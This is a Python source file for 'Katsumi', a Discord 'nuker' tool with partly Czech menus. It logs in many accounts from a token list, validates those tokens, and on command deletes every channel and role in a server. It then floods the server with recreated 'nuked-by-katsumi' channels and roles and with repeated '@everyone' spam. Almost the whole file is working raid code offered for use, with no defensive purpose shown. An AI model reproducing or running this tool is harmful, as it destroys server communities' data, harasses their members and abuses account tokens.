import colorama, requests, random, asyncio, json, os, pyfiglet, discord, traceback
from discord.ext import commands
from colorama import Fore, Back, Style
from concurrent.futures.thread import ThreadPoolExecutor

# ↓↓↓↓↓ IF YOU'RE RUNNING IN REPLIT AND HAVE YOUR .env LIKE THIS TOKENS=["token"] OR JUST HAVE YOUR TOKEN LIST IN .env SET THIS TO True ↓↓↓↓↓

envList = False

# ↑↑↑↑↑ IF YOU'RE RUNNING IN REPLIT AND HAVE YOUR .env LIKE THIS TOKENS=["token"] OR JUST HAVE YOUR TOKEN LIST IN .env SET THIS TO True ↑↑↑↑↑

f = pyfiglet.Figlet(font="shadow")
asciiArt = f.renderText
SRESET = Style.RESET_ALL
base_url = "https://discord.com/api/v9/"
clients = []
startCheck = []
global count0#, count1, count2, count3, count4, count5
count0 = 0 # spamming
count1 = 0 # creating channels
count2 = 0 # removing channels
count3 = 0 # creating roles
count4 = 0 # removing roles
count5 = 0 # server info and perms
prCount = 0 
lastPr = ""

with open("icon.jpg", "rb") as f:
  icon = f.read()

def getTokens():
	if envList == True:
		tokens = os.getenv("TOKENS")
		return json.loads(tokens)
	with open("tokens.txt", "r") as f:
	  return f.readlines()

tokens = getTokens()

def getSettings():
	with open("settings.json", "r") as f:
		stngs = json.load(f)
	return stngs

def setSettings(jsonStngs):
	with open("settings.json", "w") as f:
		json.dump(jsonStngs, f)

settings1 = getSettings()
def settingsFirstRun():
	if len(settings1) == 0:
	  message = []
	  for i in range(15):
	    message.append("@everyone Nuked by Katsumi")
	  message = " | ".join(message)
	  settings1["message"] = str(message)
	  settings1["givePerms"] = True
	  settings1["channelNames"] = ["nuked-by-katsumi","katsumi-nuked-you","katsumi-on-top", "raided-by-katsumi"]
	  settings1["roleNames"] = ["Nuked by Katsumi", "Katsumi nuked you","Katsumi on top","Raided by Katsumi"]
	  settings1["firstRun"] = True
	  setSettings(settings1)
	  settings = getSettings()
	#settings = json.dumps(settings)
	else:
	  settings = settings1
	with open("settings.json", "w") as fA:
	  json.dump(settings, fA)
	return settings
settings = settingsFirstRun()
getMessage = settings["message"]
givePerms = settings["givePerms"]
channelNames = settings["channelNames"]
roleNames = settings["roleNames"]

def getChannelName():
	return random.choice(channelNames)
def getRoleName():
	return random.choice(roleNames)
def getRandomColor():
  return random.randint(0x00000, 0xFFFFF)

def getTokens():
	with open("tokens.txt", "r") as f:
	  return f.readlines()

def cls():
	os.system("cls" if os.name == "nt" else "clear")

async def async_input(prompt: str = "") -> str:
	with ThreadPoolExecutor(1, "AsyncInput") as executor:
		return await asyncio.get_event_loop().run_in_executor(executor, input, prompt)

async def mainMenu():
#	cls()
	print(Fore.GREEN + "\n\n\n" + asciiArt("Katsumi"))
	print("\n")
	print(Fore.GREEN + Style.BRIGHT + "\n[1] " + Style.NORMAL + "Start Nuker | " + Style.DIM + "[startne každý token v tokens.txt, ujisti se že fungují]\n" + SRESET)
	print(Fore.GREEN + Style.BRIGHT + "\n[2] " + Style.NORMAL + "Token Checker | " + Style.DIM + "[checkne každý token v tokens.txt zda funguje]\n" + SRESET)
	print(Fore.GREEN + Style.BRIGHT + "\n[3] " + Style.NORMAL + "Credits | " + Style.DIM + "[ukáže ty všechny, co na tomto pracovali]\n" + SRESET)
	print(Fore.GREEN + Style.BRIGHT + "\n[4] " + Style.NORMAL + "How-To | " + Style.DIM + "[tutoriál jak na to]\n" + SRESET)
	try:
		inputInteger = int(await async_input(Fore.YELLOW + Style.BRIGHT + "\n[~] " + Style.NORMAL + "Vyber si | " + Style.DIM + "[podle čísel nalevo od funkcí, si vyber co chceš zapnout]\n" + SRESET))
		#print(inputInteger)
		if inputInteger == 1:
			loop.create_task(nukerMenu())
		elif inputInteger == 2:
			loop.create_task(tokenCheckerMenu())
		elif inputInteger == 3:
			loop.create_task(creditsMenu())
		elif inputInteger == 4:
			loop.create_task(howToMenu())
		else:
			await mainMenu()
	except:
		await mainMenu()
		
async def firstRunMenu():
	cls()
	print(Fore.GREEN + "\n\n\n" + asciiArt("Katsumi"))
	print("\n")
	print(Fore.YELLOW + Style.BRIGHT + "\n[!] " + Style.NORMAL + "It looks like it's the first time you're running this nuker, make sure to have every step in the GitHub repository done so you know what you're doing! | " + Style.DIM + "GitHub repository: github.com/asxlvm/Katsumi\n" + SRESET)
	try:
		input_ = await async_input(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "If you have done everything, press anything\n" + SRESET)
		setngs = getSettings()
		setngs["firstRun"] = False
		setSettings(setngs)
		if input_:
			await mainMenu()
		else:
			await mainMenu()
	except:
		await mainMenu()

async def redirector(typeOfRun):
	if typeOfRun == False:
		return await mainMenu()
	else:
		return await firstRunMenu()

async def tokenCheckerMenu():
	#cls()
	print(Fore.GREEN + "\n\n\n" + asciiArt("Checker"))
	print("\n")
	await checkMany(tokens)
	
def checkToken(token):
	headers = {"Authorization": token}
	r = requests.get(base_url + "users/@me", headers=headers)
	if r.status_code != 200:
		botHeaders = {"Authorization": f"Bot {token}"}
		rBot = requests.get(base_url + "users/@me", headers=botHeaders)
		if "message" in rBot.json():
			print(Fore.RED + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Invalid Token | " + Style.DIM + f"{token}\n" + SRESET)
			return False
		else:
			print(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Valid Bot Token | " + Style.DIM + f"{token}\n" + SRESET)
	else:
		print(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Valid Token | " + Style.DIM + f"{token}\n" + SRESET)
	return True

async def checkMany(tokens):
	for token in tokens:
	  checkToken(token)
	try:
		input_ = await async_input(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Done | " + Style.DIM + f"[press anything to go back]\n" + SRESET)
		if input_:
			return await mainMenu()
		else:
			return await mainMenu()
	except:
		return await mainMenu()



async def nukerMenu():
	tokenLoop = asyncio.get_event_loop()
	global controllerID
	controllerID = int(await async_input(Fore.RED + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Type your Discord ID | " + Style.DIM + f"[the commands will not run if you will not provide it]\n" + SRESET))
	for i in range(len(tokens)):
		tokenLoop.create_task(loginToken(loop, controllerID, tokens[i]))
	loop.create_task(runningMenu())

async def runningMenu():
	print(Fore.GREEN + "\n\n\n" + asciiArt("Katsumi"))
	print(Fore.GREEN + Style.BRIGHT + "\n[1] " + Style.NORMAL + "Server Joiner | " + Style.DIM +"[joins a server for every " + Style.NORMAL + "user " + Style.DIM + "token in your tokens]" + SRESET)
	print(Fore.GREEN + Style.BRIGHT + "\n[2] " + Style.NORMAL + "Back to Main Menu | " + Style.DIM +"[kills every running user] " + Style.DIM + SRESET)
	
	
async def loginToken(asyncloop, controllerID, token):
	client = commands.Bot(command_prefix="!", fetch_offline_members=False)
	client.add_cog(Nuker(client, controllerID))
	asyncloop.create_task(client.start(token))
	return

def safePrint(msg):
	global prCount, lastPr
	if lastPr == msg:
		return
	lastPr = msg
	prCount += 1
	print(msg)

class Nuker(commands.Cog):
	def __init__(self, client, controllerID):
		self.client = client
		self.controllerID = controllerID
	
	@commands.Cog.listener()
	async def on_ready(self):
		print(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Account added! | " + Style.DIM + f"{self.client.user.name}#{self.client.user.discriminator}\n" + SRESET)
	
	@commands.command()
	async def test(self, ctx):
		await ctx.send("test indeed")
	
	@commands.command(aliases=["cspam", "channelspam"])
	async def cs(self, ctx, msgCount: int = None):
		if msgCount == None:
		  msgCount = 50
		if ctx.author.id != self.controllerID:
			return
		global count0
		if count0 != 0:
			safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Spam is already going on! | " + Style.DIM + f"Wait until the spam ends\n" + SRESET)
			return
		safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Spam is starting! | " + Style.DIM + f"Going to spam {msgCount} messages in #{ctx.channel.name}\n" + SRESET)
		#count0 = 0
		for i in range(msgCount):
			await ctx.send(getMessage)
			count0 += 1
			await asyncio.sleep(0.5)
			if msgCount <= count0:
				await asyncio.sleep(3)
				safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Spam is done! | " + Style.DIM + f"Spammed {count0} messages in #{ctx.channel.name}\n" + SRESET)
				count0 = 0
				break
	
	@commands.command(aliases=["cnuke","channelnuke"])
	async def cn(self, ctx, channelCount: int= None):
		if channelCount == None:
		  channelCount = 50
		if ctx.author.id != self.controllerID:
			return
		global count1, count2
		if count2 != 0 or count1 != 0:
			safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Channel Nuke is already going on! | " + Style.DIM + f"Wait until the channel nuke ends\n" + SRESET)
			return
		for channel in ctx.guild.channels:
			await channel.delete(reason=getMessage)
			count2 += 1
		safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Channel Nuke is starting! | " + Style.DIM + f"Deleted every original channel and going to create {channelCount} Katsumi channels\n" + SRESET)
		for i in range(channelCount):
			txt = await ctx.guild.create_text_channel(getChannelName())
			count1 += 1
			await txt.send(getMessage)
			#await asyncio.sleep(0.3)
			if count1 == channelCount:			
				await asyncio.sleep(3)
				safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Channel Nuke is done! | " + Style.DIM + f"Deleted {count2} original channel(s) and created {count1} Katsumi channels\n" + SRESET)
				count1 = 0
				count2 = 0
				break
	
	@commands.command(aliases=["gspam", "globalspam"])
	async def gs(self, ctx, msgCount: int= None):
		if msgCount == None:
		  msgCount = 50
		if ctx.author.id != self.controllerID:
		  return
		global count0
		if count0 != 0:
			safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Global Spam is already going on! | " + Style.DIM + f"Wait until the spam ends\n" + SRESET)
			return
		safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Global Spam is starting! | " + Style.DIM + f"Going to spam {msgCount} messages in every channel\n" + SRESET)
		for i in range(msgCount):
			for txtchannel in ctx.guild.text_channels:
			  await txtchannel.send(getMessage)
			  #await asyncio.sleep(0.5)
			count0 += 1
			if msgCount == count0:
			  await asyncio.sleep(3)
			  safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Spam is done! | " + Style.DIM + f"Spammed {count0} messages in every channel\n" + SRESET)
			  count0 = 0
			  break
	
	@commands.command(aliases=["rnuke", "rolenuke"])
	async def rn(self, ctx, roleCount: int= None):
	  if roleCount == None:
	    roleCount = 50
	  if ctx.author.id != self.controllerID:
	    return
	  global count3, count4
	  if count3 != 0 or count4 != 0:
	    safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Role Nuke is already going on! | " + Style.DIM + f"Wait until the role nuke ends\n" + SRESET)
	    return
	  for role in ctx.guild.roles:
	    try:
	      await role.delete(reason=getMessage)
	      count4 += 1
	    except Exception:
	      continue
	  safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Role Nuke is starting! | " + Style.DIM + f"Deleted every original role and going to create {roleCount} Katsumi roles\n" + SRESET)
	  for i in range(roleCount):
	    await ctx.guild.create_role(name=getRoleName(), color=getRandomColor())
	    count3 += 1
	    if count3 == roleCount:
	      await asyncio.sleep(3)
	      safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Role Nuke is done! | " + Style.DIM + f"Deleted {count4} original role(s) and created {count3} Katsumi role\n" + SRESET)
	      count3 = 0
	      count4 = 0
	      break

if __name__ == "__main__":
	if startCheck == []:
	  global loop
	  startCheck.append("started")
	  loop = asyncio.get_event_loop()
	  sngs = getSettings()
	  settingsFirstRun()
	  loop.create_task(redirector(sngs["firstRun"]))
	  loop.run_forever()
	else:
	  pass
